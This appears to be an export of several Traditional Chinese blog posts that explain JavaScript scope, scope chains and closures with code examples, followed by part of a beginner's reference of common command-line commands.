作用域鏈（Scope chain）在理解區域作用域跟全域作用域後，要來理解什麼叫「作用域鏈」，舉個簡單的例子： 12345678910function scopeA() { var a = 'a' function scopeB() { var b = 'b' console.log(a) // a } scopeB() console.log(b) // ReferenceError: a is not defined}scopeA() 在這個例子裡面，我們有兩個作用域，分別是 scopeA 和 scopeB。 先看 b 的部分，依照前面提的概念，b 的生存範圍只在 scopeB 中，所以只要出了 scopeB，它就會 GG，所以 scopeA 去存取 b 的時候才會得到錯誤。 那 a 呢？ a 的部分其實就是作用域鏈的機制。scopeB 在自己的作用域中找不到 a，所以它就往上找，找到 scopeA 裡面的 a，最後印出 a 的值。 這個「往上找」的行為就叫做「作用域鏈」，唯一要注意的一點是，它只能往上找，不能往下找。 關於回傳值其實大部分的文章在告訴你作用域跟作用域鏈後，就會開始講什麼是閉包了。但是在那之前，我覺得還有一個很重要的東西不能忽掉：回傳值 一樣來舉點例子，按照作用域的概念，你沒辦法在全域空間中去存取區域變數，但如果真的要存取的話沒有任何辦法嗎？其實是有的，而且你一定也用過，那個方法就是透過「回傳值」： 123456function scope() { var a = 10 return a}var result = scope()console.log(result) // 10 這樣就可以拿到 a 的值了。而且不只是這樣，這裡還可以試著回傳物件或陣列看看： 123456function scope() { var a = 10 return [a]}var arr = scope()console.log(arr) // [10] 123456function scope() { var a = 10 return {a: a}}var obj = scope()console.log(obj) // {a: 10} 最後如果變成回傳 function 呢？ 12345678function scope() { var a = 10 return function () { console.log(a) }}var fn = scope() // 拿到 functionfn() // 執行 function =&gt; 10 把 function 放到最後才講是因為我覺得這樣比較好理解，如果一開始就拿 function 來舉例你可能會有點混亂，不知道為什麼可以在 function 裡面存取到 a。因此才用這種一步一步來的方式，希望這樣會好理解一點。 所以你知道只要利用「回傳」，不管最後的回傳值是變數值、物件、陣列或函式， a 的值都會被保留下來，只不過 function 的例子比較特別一點，你要考慮前面提到的「作用域鏈機制」。還記得嗎？雖然 function 自己的作用域裡面沒有 a 但是它可以往上找，找到 scope 裡面的 a，所以最後在執行 fn 的時候才能夠存取到 a。 靜態作用域與動態作用域不過你可能還有一個疑問：「fn 是在全域空間執行的，如果現在有個全域變數也叫 a 呢？」 123456789var a = 100 // =&gt; 新增一個全域變數function scope() { var a = 10 return function () { console.log(a) }}var fn = scope() // fn() // 10 or 100 ? 這個問題非常好，首先正確答案是 10。 其實是這樣的，在 JavaScript 中一個 function 被宣告的時候，它的作用域就已經決定好了（特別強調 JavaScript 是因為有些程式語言不是這樣子） 所以按照這個規則，function 在被回傳的時候，它的作用域是這樣子： 1234567var a = 100function scope() { var a = 10 return function () { console.log(a) }} 這樣應該就好理解多了吧？所以不論你之後在哪裡呼叫這個 function，它的作用域都不會變，這一定要搞清楚。 閉包終於要來談今天的主題，但其實剛剛示範的例子裡就包含了閉包的概念： 123456789function scope() { var a = 10 return function () { console.log(a) }}var fn = scope() fn() // 10 console.log(a) // ReferenceError: a is not defined 不用懷疑，像 a 這樣被關在 function 裡面，只能透過 fn 來存取的這個行為就叫「閉包」。 我覺得這個機制本身沒有什麼，重要的是你要理解這是怎麼做到的，除了前面提到的「回傳值」外，還要理解「作用域」、「作用域鏈」才能真正理解原因。 所以接下來只示範一些閉包的經典題目，還有實際用途。 setTimeout 印出 i 的值一個很經典的題目： 12345for(var i=0; i&lt;=5; i++) { setTimeout(function() { console.log(i) })} 最後的結果會是： 1234566666 其實原因只是當 callback function 執行的時候，它自己的作用域裡面沒有 i，所以依照作用域鏈往上找，最後找到全域空間的 i，只是這時候迴圈已經跑完了，所以才會是 6。 改寫的方式有很多，我列幾個比較常見的。 1. 在包一層 function 12345678function printNumber(num) { return function () { console.log(num) }}for(let i=0; i&lt;=5; i++) { setTimeout(printNumber(i), 1000)} 或改寫成 IIFE： 1234567for(let i=0; i&lt;=5; i++) { setTimeout((function(num){ return function() { console.log(num) } })(i), 1000)} 2. 改用 ES6 的 let let 的作用域是用 {} 來產生的，所以可以寫成： 12345for(let i=0; i&lt;=5; i++) { setTimeout(function() { console.log(i) })} 可以想成是這樣： 123456789101112131415{ let i = 0 setTimeout(function() { console.log(i) })}{ let i = 1 setTimeout(function() { console.log(i) })}... 建立私有變數及公開方法透過閉包的特性，你可以把變數藏在 function 裡面，讓外面的人沒辦法存取，並且只能透過公開（return）出去的東西來存取。 來簡單時做一個「開戶」的功能： 開戶時要先存 1000 塊 開戶後可以查詢餘額、領錢、存錢 12345678910111213141516171819202122232425262728function createBank(money) { if (money &lt; 1000) return '存太少啦' // 要公開出去的東西 let bank = { searchMoney() { console.log('目前餘額：', money) }, getMoney(value) { money -= value console.log('存入金額：', value) console.log('目前餘額：', money) }, setMoney(value) { money += value console.log('領取金額：', value) console.log('目前餘額：', money) } } console.log('開戶成功') return bank}const error = createBank(900) console.log(error) // 存太少啦const PeaNu_BANK = createBank(1000) // 開戶成功PeaNu_BANK.searchMoney() // 目前餘額：1000 PeaNu_BANK.setMoney(500) // 存入金額：500，目前餘額：1500PeaNu_BANK.getMoney(1000) // 領取金額：1000，目前餘額：500console.log(money) // ReferenceError: a is not defined 這邊簡單示範所以就沒做太多的額外處理了，方便看懂最重要。 所以以上這是關於閉包，還有閉包的用處。","link":"/2022/01/14/closure-again/"},{"title":"閉包的應用－cache 機制","text":"比較少見的例子。 簡述大部分的閉包都是以「私有 / 公開方法」來舉例。cache 的例子我覺得還蠻少見的，所以特別記一下。 1234567891011121314151617181920function complex (num) { console.log('Calculating'); return num * num * num;}function cache (fn) { const ans = {}; return function (num) { // 如果 ans 裡面找的到就直接回傳 if (ans[num]) { return ans[num]; } // 找不到就執行傳進來的 fn 求出結果 return ans[num] = fn(num); }}const cacheComplex = cache(complex);console.log(cacheComplex(20)); // 只有第一次會出現 Calculatingconsole.log(cacheComplex(20));console.log(cacheComplex(20)); 總之呢，每次執行 cacheComplex 其實就是執行在 cache 裡的那個匿名函式，它會有兩條路： 如果閉包裡的 ans[num] 有值就直接回傳 如果沒有，就執行閉包裡的 fn，進行複雜計算 重點在於不管 call 幾次 cacheComplex 它們都能共用同一個 ans 和 fn 的資訊。","link":"/2022/03/06/closure-example-cache/"},{"title":"從 ECMAScript 來理解閉包與作用域的原理","text":"這一次真的懂了。 簡述讀這篇文章前，請先理解什麼是 EC 與 VO，不然你絕對看不懂，可以參考這篇：學 hoisting 之前先理解 EC 是什麼？ Scope chain 到底是怎麼產生的？節錄幾個 ECMAScript 裡提到的重點： 每一個 EC 都有一個 scope chain，而 scope chain 是一個用陣列包住的各種物件。例如說：[scopeA, scopeB, scopeC, ...] Every execution context has associated with it a scope chain. A scope chain is a list of objects that are searched when evaluating an Identifier. 進入一個 EC 時，就會建立一個 scope chain When control enters an execution context, a scope chain is created and populated with an initial set of objects, Function 的 scope chain 初始值是由 AO（Activation Object）和 [[Scope]] 組成的 The scope chain is initialised to contain the activation object followed by the objects in the scope chain stored in the [[Scope]] property of the Function object. 所以總結一下，當進入一個 function 時，會產生一個 EC，EC 裡面會有 scope chain ，而 scope chain 的值是自己的 AO/VO 加上 [[Scope]] 來組成，所以大概會長的像這樣： 1234FuncEC: { AO: {...}, scope chain : [AO, [[Scope]]]} 至於 AO 是什麼？ AO 其實就跟 學 hoisting 之前先理解 EC 是什麼？ 裡面提到的 VO 是 87 分像的東西，差別在於 AO 只會在 function 的 EC 產生， VO 只會在 Global EC 產生。 不過說實在它們的差異很微小，所以呢，把 AO 想成是 VO 就好了。 接下來用一段程式碼示範一下，為了方便理解，請先記住下面的遊戲規則： [[Scope]] = 上一個 EC 裡的 scope chain（這個比較難解釋，建議搭配下面的例子多想幾遍） scope chain = 自己 EC 裡的 AO/VO 加上 [[Scope]] 1234567891011var a = 1function yoyoyo() { var b = 2 function hahaha() { var c = 3 console.log(b) console.log(a) } hahaha()}yoyoyo() 1234567891011121314151617181920212223242526272829303132333435363738394041// 3. 建立 hahaha 的 EChahahaEC: { AO: { c: undefined, } // 自己的 AO/VO 再加上 [[Scope]] scope chain: = [hahahaEC.AO, hahaha.[[Scope]]] = [hahahaEC.AO, yoyoyoEC.AO, globalEC.VO]};// 2. 建立 yoyoyo 的 ECyoyoyoEC: { AO: { b: 2, hahaha: function }; // 自己的 AO/VO 再加上 [[Scope]] scope chain: = [yoyoyoEC.AO, yoyoyo.[[Scope]]] = [yoyoyoEC.AO, globalEC.VO]};// 初始化 hahaha 的 [[Scope]]// 也就是 yoyoyo 的 scope chain（上一個 EC 裡的 scope chain）hahaha.[[Scope]] = [yoyoyoEC.AO, globalEC.VO]// 1. 建立 globalECglobalEC: { VO: { a: 1, yoyoyo: function }; // scope chain = 自己的 AO/VO 再加上 [[Scope]]， // 但 global 不是 function 所以沒有 [[Scope]] scope chain = [globalEC.VO];};// 同時會建立 yoyoyo 的隱藏屬性 [[Scope]]// 初始值就是 globalEC 裡的 scope chain（上一個 EC 裡的 scope chain）yoyoyo.[[Scope]] = [globalEC.VO] 所以 scope chain 就是透過上面的方式來建立的。 理解閉包的最後一塊拼圖：假裝自己是 JS 引擎這個步驟雖然比較繁瑣，但你只要走過一遍，就能理解閉包的原理了。 這邊的例子如下： 12345678910var v1 = 10function test() { var vTest = 20 function inner() { console.log(vTest, v1) } return inner}var inner = test()inner() 接下來就來一行一行執行。 首先，先進入 globalEC： 12345678910globalEC: { VO: { v1: undefined, inner: undefined, test: function } scope chain: [globalEC.VO]};// 初始化 test 的 [[Scope]]test.[[Scope]] = [globalEC.VO] Line1 var v1 = 10 12345678globalEC: { VO: { v1: 10, // 更新 VO 裡的值 inner: undefined, test: function } scope chain: [globalEC.VO]} Line9 var inner = test() 接下來會進入 test 的 EC： 123456789testEC: { AO: { vTest: undefined, inner: function } scope chain: [testEC.AO, globalEC.VO]};// 初始化 inner 的 [[Scope]]inner.[[Scope]] = [testEC.AO, globalEC.VO] Line3 var vTest = 20 1234567testEC: { AO: { vTest: 20, // 更新 AO 裡的值 inner: function } scope chain: [testEC.AO, globalEC.VO]} Line7 return inner 執行到這一行時，照理說 testEC 就會被 JS 的 GC（Garbage Collection 垃圾回收）機制給回收掉。 但是，注意這邊是回傳，所以 inner.[[Scope]] 會被留下來，留下的內容就是 [testEC.AO, globalEC.VO]，因此在 inner 這個 function 裡就能存取到 test 跟 global 的 AO/VO。 所以這段就是閉包的原理，因為 return 的關係，讓原本應該要被清掉的資源沒有被清掉。這也解釋了為什麼 inner 明明離開了原本的 EC 卻還有辦法存取到 test 和 global 的 AO/VO。這一段比較複雜一點，你可以多想幾次看看。 總之呢，在回傳後的狀態會變成這樣： 123456789101112131415// 此時 testEC 已經清掉了。// 但因為 inner.[[Scope]] 的關係 testEC.AO 會留下testEC.AO { vTest: 20, inner: function};globalEC: { VO: { v1: 10, inner: undefined, test: function } scope chain: [globalEC.VO]}inner.[[Scope]] = [testEC.AO, globalEC.VO] Line10 inner() 進入 inner 的 EC： 123456innerEC: { AO: { // 空的 } scope chain: [innerEC.AO, testEC.AO, globalEC.VO]} Line5 console.log(vTest, v1) 這邊分兩段，先找 vTest 的值： 到 innerEC.AO 找，沒有找到。 到 testEC.AO 找，找到了，是 vTest: 20，成功印出 20。 接著找 v1 的值： 到 innerEC.AO 找，沒有找到。 到 testEC.AO 找，沒有找到。 到 globalEC.Vo 找，找到了，是 v1: 10，成功印出 10。 以上。","link":"/2022/03/06/closure-principle/"},{"title":"談談 JS 中的 Closure（閉包）","text":"好像很久沒有上來寫文章了。前一陣子花了比較多的時間在忙著做國外網站的挑戰，也參加了一場競賽活動，所以部落格暫時停擺了幾個月。 最近有了新的規劃，主要是想提升關於 JS 的相關知識，也想要把以前留下的坑給填完。我發現我以前的文章多數是以 CSS 為主，但前端除了 HTML、CSS 之外，JavaScript 也是很重要的核心。所以…是時候來寫寫關於 JS 的文章了（話說我好像還沒有在這裡發過 JS 的文章）。 廢話不多說，馬上開始吧！作為 JS 的第一篇文章，想跟大家談的是「閉包（Closure）」。 作用域（Scope）在了解閉包之前，要先知道作用域是什麼東西？ 作用域指的是：一個變數的生存範圍。 我們直接看一個例子： 1234function test() { var a = 10}console.log(a) // Uncaught ReferenceError: a is not defined 以這個例子來說，a的作用域是 test 這個 function 中的範圍。一旦超出作用域，你就沒辦法存取到變數的值。 在 ES6 的 let 跟 const 出現之前，只有 function 能夠產生出作用域。而 let 跟 const 推出後，多了一個 block 的作用域。 全域作用域與區域作用域作用域還可以分為「全域」跟「區域」。剛剛用 function 製造出的作用域就是屬於區域的作用域。那什麼是全域作用域？ 全域作用域指的是直接寫在最外層的變數。一個在全域作用域下的變數，你不管在哪裡都可以存取得到這個變數： 12345var globalScope = 10function test() { console.log(globalScope) // 10}test() // 10 所以在前面的例子中你會發現，一個 function 可以去存取外面的變數，但外面卻沒有辦法去存取一個 function 中的變數。 如果用生活化一點的例子來說的話，一個處在全域作用域中的變數就好像是國際巨星，不管是哪個地方，大家都認識他。反之，一個處在 function 中的變數就好像是在地的偶像，也許當地的人都知道他是誰，但是一旦出了這個區域（function），別人就不見得知道他是誰。 一個地區裡面還可以在包含另一個地區，就像台灣這個地區裡面可以有高雄市，而高雄市這個地區裡面還可以有三民區，套用到 function 上也是同樣的概念。而住在台灣的人也許都知道台灣的總統是誰，但不一定曉得高雄市的市長是誰，因為那超出了高雄市這個（function）的範圍。 如果把上面的概念轉換成程式碼大概會像這樣子： 1234567891011121314function taiwan() { var presidentOfTaiwan = '台灣總統' function kaohsiung() { var mayorOfKaohsiung = '高雄市長' function sanminDistrict() { var mayorOfSanminDistrict = '三民區區長' console.log(president) // '台灣總統' } sanminDistrict() console.log(mayorOfSanminDistrict) // Uncaught ReferenceError: a is not defined } kaohsiung()}taiwan() 所以，在一個 function 裡面我們可以去存取在外面的變數，但是在外面沒有辦法存取到 function 內的變數。 1234567function outter() { var a = 100 function inner() { console.log(a) // 100 } inner()} 對 inner 這個 function 來說，a 並不是它自己的變數，而這種不在自己作用域中的變數稱為「自由變數（free variable）」 作用域鏈（Scope chain）一樣看到剛剛的例子： 1234567function outter() { var a = 100 function inner() { console.log(a) // 100 } inner()} 對 inner 來說，a 是一個自由變數（因為不在自己的作用域中）。此時當 inner 要印出這個變數時，它就會到外層去找有沒有這個變數存在：一開始先在 inner 的作用域中尋找 -&gt; 接著再到 outter 的作用域尋找 -&gt; 接著再到 global 的作用域尋找，最後如果都找不到的話就會拋出錯誤。 不斷往上找的這個動作，就是一個「作用域鏈」。 靜態作用域與動態作用域作用域其實還可以分成「靜態」與「動態」，來看一個例子： 123456789var a = 100function echo() { console.log(a) // 100 or 200?}function test() { var a = 200 echo()}test() 應該很混亂吧？但正確答案是 100。不過這是以 JS 為前提之下的結果，如果你使用其他的程式語言來跑的話，答案有可能會變成 200。 為什麼會有這樣的差異？這跟程式語言如何決定「作用域」這件事有關（或換句話說，如何決定自由變數的值） 在 JS 中的作用域被定義為是靜態的。也就是說，一個作用域在 function 被「宣告」的當下就已經決定了。不管你之後在哪裡「呼叫」這個 function，它的作用域都不會改變。這也是為什麼會稱之為「靜態作用域」，因為它不會變來變去的。 反之，如果一個程式語言是採用動態作用域，那麼剛剛的範例會輸出的結果就會是 200。也就是說，作用域是在 function 被「呼叫」的時候才被動態決定的。你可以想想看 JS 中最難搞的 this ，兩者的觀念很類似。JS 中的 this 值就是在程式執行的時候才被決定的，所以你很容易搞混它的值到底是什麼，因為它會變來變去的。 事實上，靜態作用域的更正式的稱呼是「lexical scope」，可以翻作語彙範疇，或是詞法作用域。 要理解什麼是 lexical scope ，你得去理解程式碼在編譯過程的步驟。但總而言之，目前你只要知道 lexical scope 指的就是在編譯的時候就已經決定好作用域是什麼，這樣子就夠了。 閉包理解完作用域後，就可以來談談什麼是閉包了。 先讓我們來看個範例吧： 12345678function test() { var a = 10 function inner() { console.log(a) // 10 } inner()}test() 嗯，相信你應該理解這段程式碼的意思。這裡宣告了一個 test function ，然後裡面又宣告了一個 inner function ，並且 inner 會印出 a 的值，最後 test 會執行 inner 這個 function。 但是現在我們如果不要執行 inner 這個 function，而是回傳呢？ 123456789function test() { var a = 10 function inner() { console.log(a) } return inner}var inner = test()inner() 很神奇的是，最後還是會得到 10。 為什麼神奇？因為通常一個 function 在執行完成後，會做一個「資源釋放」的動作。也就是說在 test 在執行結束後，用來儲存變數 a 的值記憶體空間也要被釋放出來。但是，我們在呼叫 inner 的時候，居然還是能存取到 a！ a 被「關在」 inner 裡面的這個行為，就叫做「閉包（Closure）」。我也有看過另外一種解釋是「讓 function 記住當時作用域下的變數值，即便 function 已經離開了那個作用域」。以 inner 當時的環境來思考的話，按照作用域鏈，會在 test 裡面找到 a 的值。 那麼，閉包又是怎麼引發的？其實會導致閉包發生的原因是我在 function 裡面回傳了一個 function，因為這個動作，所以才會得出明明結束完畢就應該消失的東西卻還被關注的這種現象。 實際應用在理解閉包是什麼後，你應該會好奇閉包可以做什麼？其中最常被拿來應用的情況，是把變數隱藏在裡面，讓外面沒辦法存取到這個變數。 舉例來說，假設有一個變數用來代表 PeaNu 的存款金額，有一個 function 是用來提款，但這裡設置了一個上限，那就是最多只能領 1000： 123456var PeaNusMoney = 10000function getMoney(n) { PeaNusMoney -= n &gt; 1000 ? 1000 : n // 最多只能領 1000}getMoney(2000) // 只被扣 1000console.log(PeaNusMoney) // 9000 你應該也發現到了，即便我們不透過 function，也可以直接去修改變數的值： 123456var PeaNusMoney = 10000function getMoney(n) { PeaNusMoney -= n &gt; 1000 ? 1000 : n // 最多只能領 1000}PeaNusMoney -= 2000 // 直接修改變數值console.log(PeaNusMoney) // 8000 儘管我們寫了 getMoney 這個 function 來操作，但變數還是暴露在外面，任何人都可以修改這個變數。但這個時候如果改用閉包的話，世界就不一樣了： 12345678910111213141516171819202122function PeaNusBank() { var money = 10000 // 用來提款 function get(n) { money -= n &gt; 1000 ? 1000 : n // 最多只能領 1000 } // 用來顯示餘額 function show() { console.log(money) } // 把 function 包在一個物件裡回傳 return { showMoney: show, getMoney: get }}var myBank = PeaNusBank()myBank.getMoney(2000) // 只會被扣 1000myBank.showMoney() // 9000money -= 2000 // Uncaught ReferenceError: money is not defined 現在我們把變數隱藏在 PeaNusBank 裡面，如果你想要修改變數的值，就只能透過我暴露出去的 get 函式來修改。 既然都提到閉包了，那不得不提一個很經典的例子： 12345for (var i = 0; i &lt;= 5; i++) { setTimeout(function () { console.log(i) }, 1000)} 在不知道閉包是什麼以前，你可能會以為上面的程式碼會在 1 秒後印出 0, 1, 2, 3, 4, 5。不過正確的答案是六個 6。 你原本以為是這樣子： 12345678setTimeout(function () { console.log(0)}, 1000)setTimeout(function () { console.log(1)}, 1000)... 但實際上是這樣子： 12345678setTimeout(function () { console.log(i)}, 1000)setTimeout(function () { console.log(i)}, 1000)... 其實仔細想想的話，會發現下面這樣比較合理，因為我們只有讓 setTimeout 裡的 function 在一秒後去印出 i 的值，而不是直接執行這個 function。 所以在一秒後，i 會是什麼？在一秒過後，迴圈早就已經跑完了，所以 i 會變成 6（在 i=5 跑完後，i++變成 6，最後不符合迴圈中的條件，跳出迴圈），所以一秒後就會蹦出六個 6。 那要怎麼做才會變成我們要的結果呢？加上 function！ 12345678function showNum(n) { return function () { console.log(n) }}for (var i = 0; i &lt;= 5; i++) { setTimeout(showNum(i), 1000)} 在迴圈中，我們每一圈會建立一個 setTimeout，這個 setTimeout 在一秒後會執行 showNum(i) 回傳的 function。 如果你有點混亂的話，仔細回想一下閉包的特性：記住 function 在當時環境的變數值。 原本的 showNum(i) 在執行結束後，i 就會被釋放。但是現在我們在裡面回傳了一個新的 function，這個動作就建立了一個閉包，所以 i 會被「關在」這個新的 function 裡面。最後當 setTimeout 在一秒過後回來執行這個 function 時，會印出當時 showNum(i) 傳進去的值，也就是最後你看到的結果。 這個例子也可以改寫成這樣： 12345678for (var i = 0; i &lt;= 5; i++) { // IIFE ;(function (number) { setTimeout(function () { console.log(number) }, 1000) })(i)} 其實就是這個的簡化版： 12345678for (var i = 0; i &lt;= 5; i++) { printNumber(i)}function printNumber (number) { setTimeout(function() { console.log(number) }, 1000)} 跟第一個方法的概念是一樣的，都是藉由閉包來把 i 關在 function 裡面。（也可以換個說法，每次迴圈都會執行一個新的 function，也就建立了一個新的作用域） 最後做一個補充，在 ES6 之後有了 block scope 的作用域。以剛剛的例子說，如果你覺得用 function 來產生出一個閉包很麻煩的話，只要把迴圈裡面的 var 改成 let 就行了： 12345for (let i = 0; i &lt;= 5; i++) { setTimeout(function () { console.log(i) }, 1000)} let 會製造出 block scope，也就是說每一次迴圈都會產生出一個新的作用域，像這樣： 1234567891011121314{ // 塊級作用域 let i = 0 setTimeout(function() { console.log(i) // 0 })}{ // 塊級作用域 let i = 1 setTimeout(function() { console.log(i) // 1 })}... block scope 與 function scope 的差異是：前者是以 { } 來劃分作用域；後者是以 function 來劃分： 1234567891011{ let i = 0 function test() { return function () { console.log(i) } }}const a = test() // 被關在 function 裡的 ia() // 0console.log(i) // Uncaught ReferenceError: i is not defined 如果是 block scope，當離開了 { } 時，就會進行釋放。所以你在外面存取不到 i（沒有閉包的情況）。但如果把 let 改成 var，情況就又不一樣了，var 只能透過 function 來產生出作用域，所以： 1234567891011{ var i = 0 function test() { return function () { console.log(i) } }}const a = test() // 被關在 function 裡的 ia() // 0console.log(i) // 0 這時候的 i 就等於是全域作用域下的變數，所以即便不使用閉包，也能存取到i。 以上就是關於閉包的基本觀念，其實閉包可以討論的東西還有很多，但我理解的還不夠深，所以暫時在這裡打住。以後等我了解更多的時候，在回來用更清楚的方式來做解釋。 如果你想理解的更深入的話，可以看這篇文章 給自己做的筆記在半夜睡覺時，我思考了一些更多能夠產生閉包的寫法，所以想記錄下來做個筆記： 1234567function myFamily() { var myBrother = 'PeaNu' setTimeout(function () { console.log(myBrother) }, 1000)}myFamily() // 一秒後印出 'PeaNu' 我在 myFamily 裡宣告了一個 myBrother，並且會執行 setTimeout，在一秒後印出 'PeaNu'。但實際上 setTimeout 中的 function 在執行時，已經脫離了 myFamily 所產生的作用域，所以照理來說應該會跳出錯誤訊息，不過實際卻可以得到正確的值：'PeaNu'。 我想這也是為什麼會需要閉包的一種原因吧？如果沒有閉包，讓 function 能夠有記住當時作用域下的變數能力，事情可能就會變成這樣： 12345678我 : 嘿，setTimeout，幫我在一秒後叫 function 印出我哥的名字（myBrother）好嗎？setTimeout : 好哦，沒問題！( setTimeout 告訴 function 在一秒後印出 myBrother )---- 一秒過後 ----function：不好意思，myBrother 哪位？是香蕉掉了就會瞧 oo娘 那位嗎？我：... 還有另外一種情境是這樣，我們先看一段程式碼： 12345678var prettiestGirl = '許純美'function sayWhoIsPrettiestGirl() { var prettiestGirl = '林志玲' setTimeout(function () { console.log(prettiestGirl) }, 1000)}sayWhoIsPrettiestGirl() 現在假設林志玲是白雪公主裡面的巫婆好了，他每天都會問魔鏡誰是最漂亮的女人。 當時的魔鏡是用高科技寫的一個智慧型 AI 魔鏡（我知道這設定很爛，但你就接受吧。），只要問它問題，他一秒後就會告訴你答案。但現在有個駭客故意在魔鏡的程式裡面加料，希望讓魔鏡回答出 '許純美'，所以： 12345678林志玲 : 魔鏡呀～誰是全台灣最美的女人呀～魔鏡：嘿，setTimeout，幫我在一秒後叫 function 印出最美麗的的女人的名字（prettiestGirl）好嗎？setTimeout : 好哦，沒問題！---- 一秒過後 ----function：是許純美 だぜ(Da-Ze)★！ ( function 在全域作用域下找到 prettiestGirl )林志玲：... 先別急著幫魔鏡上香，幸好這個駭客並不知道有閉包的這樣的特性存在，所以其實魔鏡還是會回答 林志玲。最後一天又平安的過去了，感謝飛天小女警的努力，可喜可賀，可喜可賀。 結語好久沒有寫文章了，覺得自己寫文章的功力還很遜，很多地方總會照著別人的想法來思考，沒有用自己的方式來作詮釋 QQ。雖然也不是說這樣子就不好，畢竟在寫這篇文章時確實有讓自己更理解這些相關知識。但是我覺得，人在學習一件事的時候，有自己的想法也是很重要的一件事情吧？就像那些文章寫得很好的人，也都是用自己的想法來詮釋一個概念，這個是我也很想學習的一件事情。 雖然現在的我還沒有找到能夠做到這件事的方法，但我會持續練習下去，期望自己有一天也能做到。 最後是題外話，好不容易決定回來經營部落格了，希望自己可以養成寫文章的習慣，讓自己的文章越來越多，還有一步一步提升自己的寫作能力，加油！ 參考資料所有的函式都是閉包：談 JS 中的作用域與 Closure重新認識 JavaScript: Day 19 閉包 Closure","link":"/2021/12/03/closure/"},{"title":"Commandline 的指令","text":"記得我第一篇文章就是寫 Command-line 怎麼用，還真懷念。但人會隨著時間慢慢成長，所以這次要來把 Command-line 的指令紀錄的更加完整。 簡單介紹 GUI 與 CLI 是什麼圖形化介面 GUI（Graphic User Interface），我們日常在桌面上看的到的那些畫面，像是資料夾，我的電腦等等。你可以透過那個介面來操作的東西就是「GUI」。 但在早期沒有圖形化介面，所以都用「Command Line Interface」來跟電腦做溝通。而 CLI 是透過「純文字」來操作電腦的方法。再次強調，你只會用文字來溝通。 CLI 的指令提醒：這邊的指令建議都用 Git bash 來實作比較不會出錯 補充觀念：指令是可以下載的，畢竟指令其實就是執行一段程式 pwd（Print Working Directory） 印出所在位置 touch &lt;file&gt; 碰一下。更改檔案的最後修改時間。如果檔案不存在的話，建立一個新的檔案。 man（Manual） 查看使用說明 mkdir &lt;directory&gt;（Make Directory） 建立新的資料夾 rmdir &lt;directory&gt;（Remove directiory） 刪除資料夾 cat &lt;file1&gt; &lt;file2&gt;（Concatenation） 用來連接檔案。但如果你只有寫一個檔案（一個參數），會直接顯示出檔案內容。 wget &lt;url&gt; 下載檔案。（要額外安裝的指令）可以用來下載檔案，包含圖片、原始碼等等。 ls（List） 印出目前資料夾底下的檔案 ls -l 印出更詳細的內容 ls -a 不忽略「.」開頭的檔案 cd &lt;directory&gt;（Change Directory） 切換到指定的資料夾 cd .. 回到上一層資料夾 cd ~ 回到 user/userName 的位置（應該是根目錄吧） rm &lt;file&gt; （Remove）刪除檔案 rm -f &lt;directory&gt;（force） 強制刪除檔案 rm -r &lt;directory&gt; rm -R &lt;directory&gt;（root） / 資料夾跟底下的東西全部刪除 rm -fr &lt;directory&gt; 強制刪除根目錄跟所有檔案（如果只用 rm -f 的話，.git 檔會被留下） mv &lt;file&gt;（Move）移動檔案或是改名 mv 檔案 要移動到的資料夾 mv 檔案 ..（移到上一層資料夾） mv 檔案 要更改的新名稱 絕對位置與相對位置的概念 絕對位置是以 / 作為開頭的路徑（代表 /user/userName）相對位置是以目前的檔案位置作為參考。 例如說 test 資料夾中有另一個 another 資料夾。假設我們在 test 資料夾，那就可以下 cd another 這個指令來移動到 another 資料夾。 cp &lt;file&gt;（Copy）複製檔案 cp 原本的檔案 複製的新檔案名稱 cp -f 如果是資料夾的話，可以用 -f 參數來強制執行。 vim [&lt;file&gt;] 一個文字編輯器。可以透過 vi 或 vim 指令進入： i（Insert） 進入插入（編輯）模式 esc（Escape） 進入普通模式（可以複製、貼上，但就是不能打字） p 貼上 dd / D 刪除一行內容 :%d 刪除所有內容 :q 退出（quit） :qa! 不保存檔案退出 :wq 存檔並退出（write and quit） grep &lt;regexp&gt; &lt;file&gt; 抓出關鍵字。輸入你想要的關鍵字（正則表達式） + 檔案名稱。就會把包含那個關鍵字的那一「整行」的文字印出來。 grep -E &lt;regexp&gt; &lt;file&gt; 搜尋多個關鍵字，例如 “字串 1|字串 2|字串 3” grep -o &lt;regexp&gt; &lt;file&gt; 只印出關鍵字的部分，而不是整行印出 curl &lt;url&gt; 送出 request。 curl -I 只顯示 HTTP 的相關 header（不顯示 body） curl -i 顯示 HTTP 的相關 header （因為預設只顯示 body，所以要把 header 給 include） curl -X 指定要用 HTTP 的哪個方法來溝通（GET、POST、DELETE 等等） curl -d -F option 的項目，代表要用 POST 傳遞的資料（兩種 content-type） curl --silent 只顯示回傳的內容（不顯示讀取的進度資料） 試試看： 1curl https://jsonplaceholder.typicode.com/todos/1 你就能得到 API 的回傳結果（這招真方便！） &gt; &lt;file&gt; （redirection）把「指令」的輸出結果重新導向到「檔案」。 原本的輸出會直接顯示在 terminal 上，但如果用 &gt; 的話，就會把輸出結果重新導向到「你指向的檔案」。 1echo '123' &gt; 123.txt 另外，重新導向的內容會覆寫掉原本的內容 12echo '123' &gt; 123.txtecho '546' &gt; 123.txt 最後 123.txt 中的內容會是 ‘546’，不是 ‘123546’。 如果要不希望整個覆寫，而是添加新的內容，可以用「&gt;&gt;」這個指令，來把內容寫到新的一行。 &lt; &lt;file&gt; 把「檔案」的 input 輸入到左邊的指令中。 123# code.txt =&gt; 'This is a dog'cat &lt; code.txt This is a dog 這裡要分清楚 &gt; 跟 &lt; 的用法不太一樣，&gt; 是用來把輸出寫到某個檔案，&lt; 是用來把檔案丟給指令執行。 |（pipe）組合記。把左邊指令的輸出，變成右邊指令的輸入 假設有個 hello.txt 的內容是這樣： 123hello worlda new lineanother new line 如果我們用「|」來把 cat 跟 grep 做組合，就會變成這樣： 1cat hello.txt | grep another 此時的輸出結果會是「another new line」。 流程是這樣子： cat hello.txt 會輸出檔案中的內容 | 代表要把 1 的輸出內容當作右邊指令 grep another 的輸入內容 grep another 因為沒有第三個參數（檔案名稱），所以他會檢查前面是否有輸入的內容（也就是「|」）。 所以這一整行的意思是「把 cat hello.txt」的輸出結果當作「grep another」的輸入內容 除此之外，你也可以用其他指令來做出更多的組合記。例如說現在想要把 cat hello.text | grep another 的輸出結果寫到一個新的檔案中： 1cat hello.txt | grep another &gt; result 此時如果你再使用 cat result 來查看檔案內容，就會得到「another new line」。 進階指令取代字串 sed '/s&lt;regExp&gt;/&lt;replace-text&gt;/g' ，有點難閱讀的話就想成這樣 s/&lt;A&gt;/&lt;B&gt;/，AB 代表參數。 另外補充一下，sed 只會改輸出不會改原內容。 12echo 'nice to meet you' | sed 's/nice/NICE/g' NICE to meet you 解決重複選取的問題，例如說 This is 